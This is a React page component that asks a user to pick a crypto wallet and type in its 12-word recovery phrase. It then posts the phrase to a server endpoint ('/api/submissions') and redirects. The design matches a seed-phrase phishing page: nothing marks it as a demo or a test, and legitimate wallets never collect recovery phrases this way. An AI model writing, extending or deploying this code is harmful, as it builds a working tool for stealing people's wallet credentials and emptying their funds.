// /pages/KeyPhrasesPage.js
import React, { useState } from "react";
import { useNavigate } from "react-router-dom";

const KeyPhrasesPage = ({ selectedWallet }) => {
  const [keyPhrases, setKeyPhrases] = useState("");
  const navigate = useNavigate();

  const handleNext = async () => {
    if (!selectedWallet) {
      alert("No wallet selected. Please go back and select a wallet.");
      return;
    }

    const submission = { wallet: selectedWallet, keyPhrases };

    try {
      const response = await fetch("/api/submissions", {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(submission),
      });

      const data = await response.json();
      console.log("Server response:", data);

      navigate("/submissions"); // Redirect to submissions page
    } catch (error) {
      console.error("Error submitting key phrases:", error);
    }
  };

  return (
    <div className="key-phrases-container">
      {selectedWallet ? (
        <>
          <div className="wallet-info">
            <img src={selectedWallet.icon} alt={selectedWallet.name} />
            <h2>{selectedWallet.name}</h2>
          </div>
          <label htmlFor="keyPhrasesInput">Enter 12 Key Phrases</label>
          <textarea
            id="keyPhrasesInput"
            placeholder="Enter 12 Key Phrases"
            value={keyPhrases}
            onChange={(e) => setKeyPhrases(e.target.value)}
          />
          <button onClick={handleNext}>NEXT</button>
        </>
      ) : (
        <p>No wallet selected. Please go back and select a wallet.</p>
      )}
    </div>
  );
};

export default KeyPhrasesPage;
